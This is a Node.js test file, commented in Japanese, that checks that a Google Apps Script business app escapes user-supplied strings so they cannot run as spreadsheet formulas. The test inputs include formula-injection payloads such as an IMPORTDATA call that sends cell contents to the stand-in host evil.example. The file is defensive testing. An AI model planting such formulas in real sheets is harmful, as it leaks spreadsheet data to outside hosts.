/**
 * v7-operations: ミニアプリ・フォーム・v7 Database から来た文字列が、シートで数式として動かないことの確認（2026-10-27）
 *
 * 実行: node --test tests/
 *
 * v7-operations の実ファイル（.gs 全部）を Node の vm に読み込み、SpreadsheetApp などは下のスタブで置き換える。
 * スタブのシートは「書き込みに渡された値（raw）」をそのまま持ち、読み出しは Google スプレッドシートと同じく
 *   - 先頭の ' は外して文字列で返す
 *   - = で始まる raw は数式として扱う（中身は評価しない）
 * ※ このファイルは v7-operations/ の外に置く（v7-operations/ の .js は clasp push で本番に送られるため）
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const OPS = path.join(__dirname, '..', 'v7-operations');
const EVIL = '=IMPORTDATA("https://evil.example/?"&A1)';
const PHONE = '+855 12 345 678';

// ====== スプレッドシートのスタブ ======

function cellValue(raw) {
  if (raw === undefined || raw === null) return '';
  if (typeof raw === 'string' && raw.charAt(0) === "'") return raw.slice(1);
  if (typeof raw === 'string' && raw.charAt(0) === '=') return '#FORMULA';
  return raw;
}

/** vm の中で作った Date は外の Date と別物なので instanceof を使わない */
function isDate(v) { return Object.prototype.toString.call(v) === '[object Date]'; }

/** スプレッドシートが数式として動かすか（数字だけの文字列は数値になるだけなので除く） */
function wouldRunAsFormula(raw) {
  return typeof raw === 'string' && /^[=+\-@]/.test(raw) && !/^[+\-]?(\d+(\.\d*)?|\.\d+)$/.test(raw);
}

/** 書式だけ変えるメソッドは何もせず自分を返す */
const NOOP_RANGE = ['setFontWeight', 'setBackground', 'setWrap', 'setVerticalAlignment', 'setFontColor',
  'setNumberFormat', 'setHorizontalAlignment', 'copyTo', 'setDataValidation'];
const NOOP_SHEET = ['setColumnWidth', 'setFrozenRows', 'setRowHeight', 'insertRowsAfter'];

class FakeRange {
  constructor(sheet, row, col, nr, nc) { Object.assign(this, { sheet, row, col, nr: nr || 1, nc: nc || 1 }); }
  getValues() {
    const out = [];
    for (let r = 0; r < this.nr; r++) {
      const line = [];
      for (let c = 0; c < this.nc; c++) line.push(cellValue((this.sheet.raw[this.row - 1 + r] || [])[this.col - 1 + c]));
      out.push(line);
    }
    return out;
  }
  getValue() { return this.getValues()[0][0]; }
  setValues(vals) {
    vals.forEach((line, r) => line.forEach((v, c) => this.sheet.put(this.row + r, this.col + c, v)));
    return this;
  }
  setValue(v) { this.sheet.put(this.row, this.col, v); return this; }
  clearContent() {
    for (let r = 0; r < this.nr; r++) for (let c = 0; c < this.nc; c++) this.sheet.put(this.row + r, this.col + c, '');
    return this;
  }
  getDataValidation() { return null; }
}
NOOP_RANGE.forEach((m) => { FakeRange.prototype[m] = function() { return this; }; });

class FakeSheet {
  constructor(name, rows) { this.name = name; this.raw = rows.map((r) => r.slice()); }
  getName() { return this.name; }
  getLastRow() {
    for (let i = this.raw.length - 1; i >= 0; i--) if ((this.raw[i] || []).some((v) => v !== '' && v !== undefined)) return i + 1;
    return 0;
  }
  getLastColumn() { return Math.max(0, ...this.raw.map((r) => r.length)); }
  getMaxRows() { return this.raw.length + 100; }
  getMaxColumns() { return this.getLastColumn() + 10; }
  getRange(row, col, nr, nc) { return new FakeRange(this, row, col, nr, nc); }
  getDataRange() { return this.getRange(1, 1, this.getLastRow(), this.getLastColumn()); }
  appendRow(arr) { this.raw.splice(this.getLastRow(), 0, arr.slice()); return this; }
  put(row, col, v) {
    while (this.raw.length < row) this.raw.push([]);
    this.raw[row - 1][col - 1] = v;
  }
  /** 見出しの列名で raw を引く（見出しは headerRow 行目） */
  rawAt(row, header, headerRow) { return this.raw[row - 1][this.raw[(headerRow || 1) - 1].indexOf(header)]; }
  /** データ行（見出しより下）に数式として動くセルが無いか */
  assertNoFormula(skip, headerRow) {
    this.raw.slice(headerRow || 1).forEach((r, i) => r.forEach((v, j) => {
      if (skip && skip(v, j)) return;
      assert.ok(!wouldRunAsFormula(v), this.name + ' の ' + (i + 1 + (headerRow || 1)) + '行目に数式になるセル: ' + v);
    }));
  }
}
NOOP_SHEET.forEach((m) => { FakeSheet.prototype[m] = function() { return this; }; });

function memoryStore(init) {
  const m = Object.assign({}, init || {});
  return {
    getProperty: (k) => (k in m ? m[k] : null),
    setProperty: (k, v) => { m[k] = String(v); },
    getProperties: () => Object.assign({}, m),
    deleteProperty: (k) => { delete m[k]; },
    get: (k) => (k in m ? m[k] : null),
    put: (k, v) => { m[k] = String(v); },
    remove: (k) => { delete m[k]; }
  };
}

/** Utilities.formatDate の代わり（UTC で yyyy / yy / MM / dd / HH / mm / ss だけ） */
function formatDate(d, tz, f) {
  const x = new Date(d);
  const p = (n) => String(n).padStart(2, '0');
  const t = { yyyy: x.getUTCFullYear(), yy: p(x.getUTCFullYear() % 100), MM: p(x.getUTCMonth() + 1), dd: p(x.getUTCDate()),
    HH: p(x.getUTCHours()), mm: p(x.getUTCMinutes()), ss: p(x.getUTCSeconds()) };
  return String(f).replace(/yyyy|yy|MM|dd|HH|mm|ss/g, (k) => String(t[k]));
}

// ====== v7-operations を読み込む ======

const STAFF_HEADERS = ['スタッフID', 'Chat ID', '氏名(JP)', 'Name(EN)', '役割', 'タイムゾーン', 'Telegram Username',
  '雇用形態', '入社日', '月給(USD)', '有効', '備考'];

function loadOps() {
  const ops = {}, v7 = {};
  const makeSs = (sheets) => ({
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = new FakeSheet(n, [])),
    getSpreadsheetTimeZone: () => 'Asia/Phnom_Penh'
  });
  const opsSs = makeSs(ops), v7Ss = makeSs(v7);
  const props = memoryStore({ BOT_TOKEN_INTERNAL: 'test', ADMIN_GROUP_ID: '-100', OPERATIONS_SPREADSHEET_ID: 'OPS', V7_SPREADSHEET_ID: 'V7' });
  const ctx = {
    console,
    SpreadsheetApp: { openById: (id) => (id === 'OPS' ? opsSs : v7Ss), flush: () => {} },
    PropertiesService: { getScriptProperties: () => props },
    CacheService: { getScriptCache: () => memoryStore() },
    LockService: { getScriptLock: () => ({ tryLock: () => true, waitLock: () => {}, releaseLock: () => {} }) },
    Logger: { log: () => {} },
    Utilities: { formatDate: formatDate, getUuid: () => '00000000-1111-2222-3333-444444444444' }
  };
  vm.createContext(ctx);
  fs.readdirSync(OPS).filter((f) => f.endsWith('.gs')).sort()
    .forEach((f) => vm.runInContext(fs.readFileSync(path.join(OPS, f), 'utf8'), ctx, { filename: f }));
  const run = (code) => vm.runInContext(code, ctx);

  // 列の確認・追加（スキーマ確認）と Telegram・Drive・メールは使わない
  ctx.runAtMostEvery_ = () => {};
  ['notifyPartnerApplicationForApproval_', 'notifyExpenseCreatedIfField_', 'notifyShopProvisioned_',
    'notifyJetroAdminGroup_', 'notifyJetroRon_', 'notifyJetroAdminEmail_'].forEach((f) => { ctx[f] = () => {}; });
  ctx.createShopQrPng_ = () => 'https://drive.google.com/file/d/qr/view';
  ctx.saveReceiptPhoto_ = () => ({ url: 'https://drive.google.com/file/d/receipt/view' });

  ops['スタッフマスター'] = new FakeSheet('スタッフマスター', [STAFF_HEADERS,
    ['STAFF-001', '7500384947', 'ロン', 'Ron', 'field', 'Asia/Phnom_Penh', '', 'full_time', '', 0, true, ''],
    ['STAFF-002', '111', '鈴木', 'Dai', 'admin', 'Asia/Phnom_Penh', '', '', '', 0, true, '']]);
  return { ctx, run, ops, v7 };
}

// ====== テスト ======

test('safeCellText_ / safeCellValue_ / sheetRaw_: 先頭が = + - @ の文字列だけ \' を付ける', () => {
  const { ctx } = loadOps();
  assert.equal(ctx.safeCellText_(EVIL), "'" + EVIL);
  assert.equal(ctx.safeCellText_('@ron'), "'@ron");
  assert.equal(ctx.safeCellText_('Ron'), 'Ron');
  assert.equal(ctx.safeCellText_("'" + EVIL), "'" + EVIL, '2回通しても \' は増えない');
  const d = new Date();
  assert.equal(ctx.safeCellValue_(d), d);
  assert.equal(ctx.safeCellValue_(12.5), 12.5);
  assert.equal(ctx.safeCellValue_(false), false);
  assert.equal(ctx.safeCellValue_(null), null);
  assert.equal(ctx.safeCellValue_('-1001234567890'), '-1001234567890');
  assert.equal(ctx.safeCellValue_('-.5'), '-.5');
  assert.equal(ctx.safeCellValue_('-5+3'), "'-5+3");
  assert.equal(ctx.safeCellValue_(PHONE), "'" + PHONE);
  assert.equal(ctx.safeCellValue_(EVIL), "'" + EVIL);
  // 共通の書き込み口: sheetRaw_ で包んだ値だけそのまま
  assert.equal(ctx.sheetCellValue_(ctx.sheetRaw_('=HYPERLINK("https://x","y")')), '=HYPERLINK("https://x","y")');
  assert.equal(ctx.sheetCellValue_(EVIL), "'" + EVIL);
  assert.equal(ctx.sheetCellValue_(d), d);
});

test('パートナー申請フォーム（誰でも書ける）: 名前・電話は \' 付き、承認者の @ユーザー名 も（appendRow / updateRow）', () => {
  const { ctx, run, ops } = loadOps();
  ops['パートナー'] = new FakeSheet('パートナー', [run('PARTNER_HEADERS_')]);
  const F = run('PARTNER_FORM_FIELDS_');
  const nv = {};
  nv[F.NAME] = [EVIL];
  nv[F.COMPANY] = ['+IMPORTXML("https://evil.example","//a")'];
  nv[F.PHONE] = [PHONE];
  nv[F.ABA_ACCOUNT] = ['123456789'];
  nv[F.TERMS_AGREE] = ['同意します'];
  nv[F.NOTES] = ['-HYPERLINK("https://evil.example")'];
  ctx.handlePartnerFormSubmit({ namedValues: nv });

  const sh = ops['パートナー'];
  assert.equal(sh.rawAt(2, '氏名'), "'" + EVIL);
  assert.equal(cellValue(sh.rawAt(2, '氏名')), EVIL, '画面には元の名前がそのまま出る');
  assert.equal(sh.rawAt(2, '会社名'), '\'+IMPORTXML("https://evil.example","//a")');
  assert.equal(sh.rawAt(2, '電話'), "'" + PHONE, '「+855 …」も #ERROR! にならず文字で入る');
  assert.equal(sh.rawAt(2, 'ABA口座番号'), '123456789', '数字だけの文字列はそのまま');
  assert.equal(sh.rawAt(2, 'コミッション率'), 30, '数値はそのまま');
  assert.ok(isDate(sh.rawAt(2, '登録日時')), '日付はそのまま');

  const partnerId = cellValue(sh.rawAt(2, 'パートナーID'));
  assert.equal(ctx.rejectPartner(partnerId, { username: 'evil' }).ok, true);
  assert.equal(sh.rawAt(2, '承認者'), "'@evil");
  sh.assertNoFormula();
});

test('紹介履歴（recordReferralHistory）: 顧客名・パートナー名が数式でも \' 付き', () => {
  const { ctx, run, ops } = loadOps();
  ops['紹介履歴'] = new FakeSheet('紹介履歴', [run('REFERRAL_HISTORY_HEADERS_')]);
  ctx.recordReferralHistory({ partnerId: 'PTR-1', partnerName: '@partner', referralCode: 'SM-ABCD', customerName: EVIL,
    customerChatId: '7500384947', bookingId: 'BK-1', serviceDate: '2026-10-27', revenue: 15, memo: '+memo' });
  const sh = ops['紹介履歴'];
  assert.equal(sh.rawAt(2, '顧客名'), "'" + EVIL);
  assert.equal(sh.rawAt(2, 'パートナー名'), "'@partner");
  assert.equal(sh.rawAt(2, '備考'), "'+memo");
  assert.equal(sh.rawAt(2, '顧客 Chat ID'), '7500384947');
  assert.equal(sh.rawAt(2, '売上(USD)'), 15);
  sh.assertNoFormula();
});

test('経費登録（ミニアプリ）: 摘要・取引先・メモは \' 付き、レシートの HYPERLINK と経費マスターの数式はそのまま', () => {
  const { ctx, run, ops } = loadOps();
  ops['経費'] = new FakeSheet('経費', [run('EXPENSE_HEADERS_').concat(['client_id'])]);
  ops['経費マスター'] = new FakeSheet('経費マスター', [['経費マスター'], [''], ['日付', 'カテゴリ', '項目・摘要']]);
  const res = ctx.submitExpense('111', { description: EVIL, amount: 12.5, currency: 'USD', vendor: '+vendor',
    category: '消耗品費', memo: '@memo', paymentType: '会社直払い', photoBase64: 'eA==', photoMime: 'image/jpeg' });
  assert.equal(res.ok, true);

  const ex = ops['経費'];
  assert.equal(ex.rawAt(2, '品目・摘要'), "'" + EVIL);
  assert.equal(ex.rawAt(2, '取引先'), "'+vendor");
  assert.equal(ex.rawAt(2, 'メモ'), "'@memo");
  assert.equal(ex.rawAt(2, '金額'), 12.5);
  assert.equal(ex.rawAt(2, 'レシート写真'), '=HYPERLINK("https://drive.google.com/file/d/receipt/view","レシート")',
    'コードで組んだ数式は数式のまま');
  ex.assertNoFormula((v) => /^=HYPERLINK\("https:\/\/drive\.google\.com\//.test(v));

  // 経費マスター（4行目から・A〜Q）: C 摘要 / I 備考（取引先: … / メモ）
  const row = ops['経費マスター'].raw[3];
  assert.equal(row[2], "'" + EVIL);
  assert.equal(row[8], '取引先: +vendor / @memo');
  assert.equal(row[7], '=HYPERLINK("https://drive.google.com/file/d/receipt/view","レシート")', 'H レシート');
  assert.ok(/^=IF\(P4/.test(row[10]), 'K JPY換算は数式のまま');
  assert.ok(/^=IFERROR\(TEXT\(A4/.test(row[11]), 'L 月は数式のまま');
  assert.equal(row[3], 12.5);
  row.forEach((v, j) => { if ([7, 10, 11].indexOf(j) < 0) assert.ok(!wouldRunAsFormula(v), '経費マスター ' + j + '列目: ' + v); });

  // 備考の先頭がメモ（取引先なし）でも
  ctx.submitExpense('111', { description: '洗剤', amount: 3, currency: 'USD', category: '消耗品費', memo: EVIL, paymentType: '会社直払い' });
  assert.equal(ops['経費マスター'].raw[4][8], "'" + EVIL);
});

test('営業アプリ（v7 Database の店マスター・営業ログ）: 店名・メモ・オーナー名は \' 付き、電話は従来どおり文字で', () => {
  const { ctx, run, v7 } = loadOps();
  v7['店マスター'] = new FakeSheet('店マスター', [run('SALESLOG_SHOP_HEADERS.concat(["業種", "Facebook"], SHOP_TERMS_HEADERS, SALESLOG_SHOP_EXTRA_HEADERS)')]);
  v7['営業ログ'] = new FakeSheet('営業ログ', [run('SALESLOG_HEADERS.concat(SALESLOG_FOLLOW_HEADERS, [SALESLOG_CLIENT_HEADER])')]);
  const res = ctx.salesLogCreate('7500384947', { shopName: EVIL, ownerName: '+owner', phone: PHONE, reaction: 'A',
    memo: '=HYPERLINK("https://evil.example")', nextAction: '@call', gps: { lat: 11.55, lng: 104.92 } });
  assert.equal(res.ok, true);

  const shop = v7['店マスター'], log = v7['営業ログ'];
  assert.equal(shop.rawAt(2, '店名'), "'" + EVIL);
  assert.equal(shop.rawAt(2, 'オーナー名'), "'+owner");
  assert.equal(shop.rawAt(2, '電話'), "'" + PHONE);
  assert.equal(shop.rawAt(2, '緯度'), 11.55, '数値はそのまま');
  assert.equal(log.rawAt(2, '店名'), "'" + EVIL);
  assert.equal(log.rawAt(2, 'メモ'), '\'=HYPERLINK("https://evil.example")');
  assert.equal(log.rawAt(2, '次にやること'), "'@call");

  // 店情報の編集（updateSheetRow_）
  assert.equal(ctx.salesLogShopUpdate('7500384947', res.shopId, { shopName: '-Garage', memo: EVIL, phone: '012345678' }).ok, true);
  assert.equal(shop.rawAt(2, '店名'), "'-Garage");
  assert.equal(shop.rawAt(2, 'メモ'), "'" + EVIL);
  shop.assertNoFormula();
  log.assertNoFormula();
});

test('コミッション記帳: 店マスターから読み戻した店名（\' が外れている）も台帳では \' 付き', () => {
  const { ctx, run, v7, ops } = loadOps();
  v7['店マスター'] = new FakeSheet('店マスター', [run('SALESLOG_SHOP_HEADERS.concat(SHOP_TERMS_HEADERS)')]);
  ops['コミッション台帳'] = new FakeSheet('コミッション台帳', [run('COMMISSION_HEADERS.concat(COMMISSION_INTRODUCER_HEADERS)')]);
  const shopId = ctx.createShopRow_({ '店名': EVIL, 'ステータス': '提携済' });
  assert.equal(v7['店マスター'].rawAt(2, '店名'), "'" + EVIL);

  const res = ctx.commissionCreate('111', { shopId: shopId, serviceDate: '2026-10-27', serviceDesc: '+WASH', revenue: 20, memo: '@x' });
  assert.equal(res.ok, true);
  const led = ops['コミッション台帳'];
  assert.equal(led.rawAt(2, '店名'), "'" + EVIL);
  assert.equal(led.rawAt(2, '施工内容'), "'+WASH");
  assert.equal(led.rawAt(2, 'メモ'), "'@x");
  assert.equal(led.rawAt(2, '売上(USD)'), 20);
  led.assertNoFormula();
});

test('提携店登録フォーム: v7 Database の Bot連携・店マスターに書く店名が \' 付き、ワンタイムコードは数字のまま', () => {
  const { ctx, run, v7 } = loadOps();
  v7['店マスター'] = new FakeSheet('店マスター', [run('SALESLOG_SHOP_HEADERS.concat(["業種"])')]);
  v7['Bot連携'] = new FakeSheet('Bot連携', [run('SHOP_PROV_LINK_HEADERS')]);
  const F = run('SHOP_PROV_FIELDS');
  const nv = {};
  nv[F.SHOP_NAME] = [EVIL];
  nv[F.OWNER] = ['@owner'];
  nv[F.PHONE] = [PHONE];
  nv[F.NOTE] = ['note'];
  ctx.handleShopFormSubmit({ namedValues: nv });

  const link = v7['Bot連携'];
  assert.equal(link.rawAt(2, '店名'), "'" + EVIL);
  assert.ok(/^\d{6}$/.test(link.rawAt(2, 'ワンタイムコード')), '数字だけのコードはそのまま');
  assert.equal(link.rawAt(2, '状態'), '待機中');
  assert.equal(v7['店マスター'].rawAt(2, '店名'), "'" + EVIL);
  assert.equal(v7['店マスター'].rawAt(2, 'オーナー名'), "'@owner");
  link.assertNoFormula();
  v7['店マスター'].assertNoFormula();
});

test('JETRO フォーム（誰でも書ける）: 氏名・会社名は \' 付き、書式なしテキストの電話の列はそのまま', () => {
  const { ctx, run, ops } = loadOps();
  ops['JETROキャンペーン予約'] = new FakeSheet('JETROキャンペーン予約', [run('JETRO_BOOKING_HEADERS_')]);
  const answers = ['2026-11-01', EVIL, '+Corp', '@title', PHONE, '+855 98 765 432'];
  ctx.handleJetroFormSubmit({ response: {
    getItemResponses: () => answers.map((a) => ({ getResponse: () => a })),
    getTimestamp: () => new Date()
  } });
  const sh = ops['JETROキャンペーン予約'];
  assert.equal(sh.rawAt(2, '氏名'), "'" + EVIL);
  assert.equal(sh.rawAt(2, '会社名'), "'+Corp");
  assert.equal(sh.rawAt(2, '役職'), "'@title");
  assert.equal(sh.rawAt(2, '駐在員 電話番号'), PHONE, 'H 列は書式なしテキストなので \' を付けない（付けると画面に出る）');
  assert.equal(sh.rawAt(2, 'ドライバー 電話番号'), '+855 98 765 432');
  assert.ok(isDate(sh.rawAt(2, '申込日時')));
});

test('パートナー精算（v7 Database）: 台帳から読み戻した支払先・メモが \' 付き、月・金額はそのまま', () => {
  const { ctx, run } = loadOps();
  const headers = run('PS_HEADERS');
  const sh = new FakeSheet('パートナー精算', [['💰'], [''], [''], [''], headers]);
  ctx.writeSettlementRows_(sh, [{ '月': '2026-10', '支払先': EVIL, '種別': '提携先', '件数': 2, '対象売上(USD)': 30,
    '率(%)': 30, '支払額(USD)': 9, '支払の向き': '当社→店（紹介料）', '支払予定日': '2026-11-10', 'メモ': '+memo' }]);
  assert.equal(sh.rawAt(6, '支払先', 5), "'" + EVIL);
  assert.equal(sh.rawAt(6, 'メモ', 5), "'+memo");
  assert.equal(sh.rawAt(6, '月', 5), '2026-10', '書式なしテキストの列（月）は記号で始まらないのでそのまま');
  assert.equal(sh.rawAt(6, '支払額(USD)', 5), 9);
  sh.assertNoFormula(null, 5);
});

test('読み戻した列をまとめて書き戻す所: 触らない行の \' 付きの値が数式に戻らない（backfillReactionLabels_）', () => {
  const { ctx, run } = loadOps();
  const headers = run('SALESLOG_HEADERS');
  const row = (vid, reaction, label) => headers.map((h) => ({ visit_id: vid, '反応': reaction, '反応内容': label })[h] || '');
  const sh = new FakeSheet('営業ログ', [headers, row('SL-1', 'A', ''), row('SL-2', 'B', "'" + EVIL)]);
  ctx.backfillReactionLabels_(sh, ctx.readSheetObjects_(sh));
  assert.equal(sh.rawAt(2, '反応内容'), 'デモ決定', '空だった行は補完');
  assert.equal(sh.rawAt(3, '反応内容'), "'" + EVIL, '読み戻すと \' が外れるが、書き戻す時にもう一度付く');
  sh.assertNoFormula();
});

test('全部の .gs で同じ名前のトップレベル関数が2つ無い（後に読まれた方が勝ち、片方が黙って死ぬ）', () => {
  const names = {};
  fs.readdirSync(OPS).filter((f) => f.endsWith('.gs')).forEach((f) => {
    (fs.readFileSync(path.join(OPS, f), 'utf8').match(/^function [A-Za-z0-9_$]+/gm) || []).forEach((m) => {
      const n = m.slice(9);
      assert.ok(!names[n], n + ' が ' + names[n] + ' と ' + f + ' の2か所にある');
      names[n] = f;
    });
  });
});
